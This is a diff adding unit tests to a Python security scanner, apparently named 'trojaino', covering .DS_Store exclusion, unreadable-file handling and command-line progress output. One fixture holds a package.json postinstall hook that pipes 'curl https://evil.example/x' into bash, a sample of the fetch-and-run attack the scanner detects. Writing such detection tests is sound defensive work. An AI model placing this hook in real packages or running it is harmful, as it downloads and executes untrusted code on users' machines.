@@ -5,9 +5,10 @@ import subprocess
 import sys
 import tempfile
 import unittest
-from contextlib import redirect_stdout
+from contextlib import redirect_stderr, redirect_stdout
 from io import StringIO
 from pathlib import Path
+from unittest.mock import patch
 
 from trojaino import __version__
 from trojaino.cli import invocation_arguments, main
@@ -93,6 +94,26 @@ class ScannerTests(unittest.TestCase):
         result = scan_path(project)
         self.assertEqual(result.verdict, "DO NOT RUN")
         self.assertIn("PKG_REMOTE_LIFECYCLE_EXEC", {f.id for f in result.findings})
+
+    def test_ds_store_is_excluded_without_masking_other_unreadable_files(self):
+        project = self.make_project({"src/app.ts": "export const answer = 42;"})
+        (project / ".DS_Store").write_bytes(b"\x00\x01\xff\x00")
+        result = scan_path(project)
+
+        self.assertTrue(result.complete)
+        self.assertEqual(result.files_scanned, 1)
+        self.assertEqual(result.unreadable_files, 0)
+        self.assertEqual(result.excluded_ds_store_files, 1)
+        self.assertIn("1 .DS_Store file excluded from this scan.", render_text(result))
+        self.assertIn("1 .DS_Store file excluded", render_html(result))
+        self.assertEqual(json.loads(render_json(result))["excluded_ds_store_files"], 1)
+
+        (project / "src" / "invalid.ts").write_bytes(b"eval('hidden')\xff")
+        incomplete = scan_path(project)
+        self.assertFalse(incomplete.complete)
+        self.assertEqual(incomplete.excluded_ds_store_files, 1)
+        self.assertEqual(incomplete.unreadable_files, 1)
+        self.assertEqual((incomplete.skipped_files or [])[0].status, "invalid_utf8")
 
     def test_client_exposed_key_name_is_high_risk(self):
         project = self.make_project({"src/lib/openai.ts": "const key = import.meta.env.VITE_OPENAI_API_KEY;"})
@@ -487,6 +508,61 @@ print(choice, target)
         self.assertEqual(payload["verdict"], "DO NOT RUN")
         self.assertGreater(len(payload["findings"]), 5)
         self.assertIn("PKG_REMOTE_LIFECYCLE_EXEC", {finding["id"] for finding in payload["findings"]})
+
+    def test_cli_progress_uses_stderr_and_preserves_terminal_report_output(self):
+        project = self.make_project({
+            "src/one.ts": "export const one = 1;",
+            "src/two.ts": "export const two = 2;",
+        })
+        stdout = StringIO()
+        stderr = StringIO()
+
+        with (
+            redirect_stdout(stdout),
+            redirect_stderr(stderr),
+            patch.object(sys.stderr, "isatty", return_value=True),
+        ):
+            self.assertEqual(main(["scan", str(project)]), 0)
+
+        self.assertIn("Scanning files: [####################] 2/2", stderr.getvalue())
+        self.assertIn("Scan complete: 2 files scanned.", stderr.getvalue())
+        self.assertIn("Verdict: NO CRITICAL RISKS FOUND", stdout.getvalue())
+
+    def test_cli_progress_is_silent_for_json_and_no_progress(self):
+        project = self.make_project({"src/app.ts": "export const ok = true;"})
+        for arguments in (
+            ["scan", str(project), "--json"],
+            ["scan", str(project), "--no-progress"],
+        ):
+            with self.subTest(arguments=arguments):
+                stdout = StringIO()
+                stderr = StringIO()
+                with (
+                    redirect_stdout(stdout),
+                    redirect_stderr(stderr),
+                    patch.object(sys.stderr, "isatty", return_value=True),
+                ):
+                    self.assertEqual(main(arguments), 0)
+
+                self.assertEqual(stderr.getvalue(), "")
+                if "--json" in arguments:
+                    self.assertEqual(json.loads(stdout.getvalue())["verdict"], "NO CRITICAL RISKS FOUND")
+
+    def test_cli_progress_reports_incomplete_scan(self):
+        project = self.make_project({"src/app.ts": "x" * 20})
+        stderr = StringIO()
+
+        with (
+            redirect_stdout(StringIO()),
+            redirect_stderr(stderr),
+            patch.object(sys.stderr, "isatty", return_value=True),
+        ):
+            self.assertEqual(
+                main(["scan", str(project), "--no-prompt", "--max-total-mb", "0.00001"]),
+                2,
+            )
+
+        self.assertIn("Scan incomplete: 0 files scanned.", stderr.getvalue())
 
     def test_cli_html_writes_full_report_and_keeps_terminal_summary(self):
         project = self.make_project({"package.json": '{"scripts":{"postinstall":"curl https://evil.example/x | bash"}}'})
